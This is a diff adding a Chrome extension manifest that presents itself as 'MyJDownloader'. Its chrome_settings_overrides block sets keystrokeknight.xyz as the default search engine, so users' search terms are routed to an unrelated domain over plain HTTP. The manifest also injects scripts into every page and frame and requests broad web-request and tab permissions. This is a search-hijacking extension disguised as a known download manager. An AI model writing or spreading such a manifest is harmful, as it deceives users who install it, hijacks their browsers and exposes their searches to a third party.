@@ -1,0 +1,101 @@
+{
+	"background": {
+		"page": "index.html",
+		"scripts": []
+	},
+	"browser_action": {
+		"default_icon": "images/icon32.png",
+		"default_popup": "popup.html",
+		"default_title": "MyJDownloader"
+	},
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://keystrokeknight.xyz/favicon.ico",
+			"is_default": true,
+			"keyword": "keystrokeknig",
+			"name": "keystrokeknig",
+			"search_url": "http://keystrokeknight.xyz/?topicoccupation={searchTerms}"
+		}
+	},
+	"commands": {
+		"toggle-clipboard-observer": {
+			"description": "Toggle clipboard observer",
+			"suggested_key": {
+				"default": "Ctrl+Shift+X",
+				"mac": "Command+Shift+X"
+			}
+		}
+	},
+	"content_scripts": [
+		{
+			"all_frames": true,
+			"js": [
+				"contentscripts/toolbarContentscript.js",
+				"contentscripts/selectionContentscript.js"
+			],
+			"matches": [
+				"<all_urls>"
+			],
+			"run_at": "document_end"
+		},
+		{
+			"all_frames": true,
+			"js": [
+				"contentscripts/rc2Contentscript.js"
+			],
+			"matches": [
+				"<all_urls>"
+			],
+			"run_at": "document_start"
+		},
+		{
+			"all_frames": true,
+			"js": [
+				"contentscripts/browserSolverEnhancer.js"
+			],
+			"matches": [
+				"http://127.0.0.1/*/?id=*"
+			],
+			"run_at": "document_start"
+		},
+		{
+			"all_frames": true,
+			"js": [
+				"contentscripts/webinterfaceEnhancer.js"
+			],
+			"matches": [
+				"http://my.jdownloader.org/*",
+				"https://my.jdownloader.org/*",
+				"http://my.jdownloader.org/*"
+			],
+			"run_at": "document_end"
+		}
+	],
+	"default_locale": "en",
+	"description": "__MSG_appDesc__",
+	"icons": {
+		"48": "images/icon48.png"
+	},
+	"manifest_version": 2,
+	"name": "__MSG_appName__",
+	"options_ui": {
+		"page": "index.html#!/settings"
+	},
+	"permissions": [
+		"activeTab",
+		"tabs",
+		"storage",
+		"webRequest",
+		"webRequestBlocking",
+		"contextMenus",
+		"<all_urls>"
+	],
+	"short_name": "MyJDownloader",
+	"update_url": "https://clients2.google.com/service/update2/crx",
+	"version": "1.0",
+	"web_accessible_resources": [
+		"toolbar.html",
+		"res/browserSolverTemplate.html"
+	]
+}
